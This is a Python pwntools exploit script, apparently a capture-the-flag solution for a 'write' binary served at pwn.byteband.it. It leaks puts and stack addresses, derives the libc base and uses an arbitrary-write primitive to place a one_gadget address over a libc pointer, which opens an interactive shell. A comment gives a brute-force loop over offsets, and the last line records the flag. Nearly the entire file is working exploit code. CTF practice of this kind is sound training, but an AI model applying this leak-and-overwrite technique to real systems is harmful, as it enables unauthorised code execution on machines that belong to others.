from pwn import *
import signal
import sys

# Init config
prog_name = './write'
context.binary = prog_name 
## init of python
debug = int(sys.argv[1])
online=False
if( debug == 0):
  r = remote("pwn.byteband.it", 9000)
  libcz = ELF("./libc-2.27.so")
  online=True
elif(debug == 1):
  r = process(prog_name, env={'LD_PRELOAD':'./libc-2.27.so'})
  libcz = ELF("./libc-2.27.so")

def halt():
  while True:
    log.info( r.recvline() )

# or if you have issue, use interactive but instead you need to open it in another terminal
def interactive():
  if not online:
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()

def get_one_gadget():
    return list(map(
        int,
        subprocess.check_output(['one_gadget', '--raw', libcz.path]).split(b' ')
    ))

def pwn(x):
  r.recvuntil("puts: ")
  puts_leak = int(r.recvline().rstrip(), 16)
  r.recvuntil("stack: ")
  stack_leak = int(r.recvline().rstrip(), 16) - x*8

  offset_puts = libcz.symbols['puts']
  libc_base = puts_leak - offset_puts
  here = libc_base + 0x3eb0a8
  one_gadget = libc_base + get_one_gadget()[1]
  log.info("[+] puts leak:0x{0:x}".format(puts_leak))
  log.info("[+] libc 0x{0:x}".format(libc_base))
  log.info("[+] here 0x{0:x}".format(here))
  log.info("[+] one_gadget 0x{0:x}".format(one_gadget))
  log.info("[+] stack_leak 0x{0:x}".format(stack_leak))
  
  r.sendline("w")
  r.recvuntil("ptr:")
  r.sendline(str(stack_leak))
  r.recvuntil("val:")
  r.sendline(str(0))

  r.sendline("w")
  r.recvuntil("ptr:")
  r.sendline(str(here))
  r.recvuntil("val:")
  r.sendline(str(one_gadget))
  r.interactive()
  return

# launch it with: for x in {1..100}; do echo -ne "$x "; python solution.py 0 $x; done
pwn(int(sys.argv[2])) # flag{imma_da_pwn_mAst3r}

